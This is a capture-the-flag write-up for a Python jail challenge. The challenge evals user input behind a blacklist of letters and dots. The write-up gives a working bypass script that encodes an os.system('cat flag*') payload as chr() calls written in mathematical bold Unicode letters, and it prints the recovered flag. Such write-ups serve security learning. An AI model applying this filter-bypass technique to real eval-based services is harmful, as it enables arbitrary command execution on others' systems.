#### Challenge:

Heard that eval is dangerous and made sure it is secure this time.

[calculator.zip](./calculator.zip ":ignore")

---

#### Solution:

We are given `python script` (with `Dockerfile` to see the infra part) containing `pyjail`:

```python
import sys

print("This is a calculator")

inp = input("Formula: ")

sys.stdin.close()

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."

if any(x in inp for x in blacklist):
    print("Nice try")
    exit()

fns = {
    "pow": pow
}

print(eval(inp, fns, fns))
```

We need to break out from `eval()` and print contents of the flag file, but the catch is, there is a blacklist of all the upper and lower case letters and `dot`. Luckily I found a writeup on the net that bypassed similar situation using `UTF-8` letters in bold or italic, that python has no problem interpreting as their normal counterparts. To bypass the dot (and also because not all of Python constructs behave correctly when in `UTF-8`) I encoded the whole payload in `chr()` and and wrapped it in mathematical bold `eval()` ().

```python
#!/usr/bin/python

import string

## Mathematical bold script letters
mat_b_letters = ''.join([chr(x) for x in range(0x1D4D0, 0x1D503 + 1)])
ascii_letters = string.ascii_uppercase + string.ascii_lowercase
trans_table   = ascii_letters.maketrans(ascii_letters, mat_b_letters)

text = '__import__("os").system("cat flag*")'

encoded_text=""
for x in text:
    encoded_text = encoded_text + f"chr({ord(x)})+"
encoded_text = encoded_text[:-1]

encoded_text=f'eval({encoded_text})'

## Change to UTF-8 letter
print(encoded_text.translate(trans_table))

## To test run:
# sudo docker build -t calc1 .
# sudo docker run -p 1337:1337 calc1
# python3 calc1.py | nc 127.0.0.1 1337
```

---

<details><summary>FLAG:</summary>

```
TFCCTF{18641f40c9beac02ceeaf87db851c386}
```

</details>
<br/>
